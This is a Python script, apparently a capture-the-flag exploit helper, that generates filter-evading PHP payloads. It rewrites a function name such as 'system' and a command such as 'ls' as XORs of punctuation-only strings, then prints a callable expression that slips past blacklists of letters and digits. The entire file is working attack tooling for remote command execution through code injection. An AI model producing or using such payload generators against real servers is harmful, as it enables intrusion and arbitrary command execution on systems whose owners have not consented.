from pwn import *
import sys
import string

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <function> <argument>")
    print(f"Example: python3 gen.py system ls")
    exit()

func = sys.argv[1]
arg = sys.argv[2]

def generate(expected, valid_chars):
    word1 = ""
    word2 = ""
    for i in expected:
        found = False
        for char1 in valid_chars:
            for char2 in valid_chars:
                res = chr(ord(char1) ^ ord(char2))
                if res == i:
                    word1 += char1
                    word2 += char2 
                    found = True
                    break
            if found:
                break

    return word1, word2


valid_chars = []
for char in string.printable:
    if char not in string.ascii_letters + string.digits:
        valid_chars.append(char)

word1, word2 = generate(func, valid_chars)
print(f"{func} = word1 ^ word2 = {xor(word1, word2).decode()}")

word3, word4 = generate(arg, valid_chars)
print(f"{arg} = word3 ^ word4 = {xor(word3, word4).decode()}")

payload = f"((\"{word1}\")^(\"{word2}\"))((\"{word3}\")^(\"{word4}\"))"
print(f"Payload: {payload.encode()}")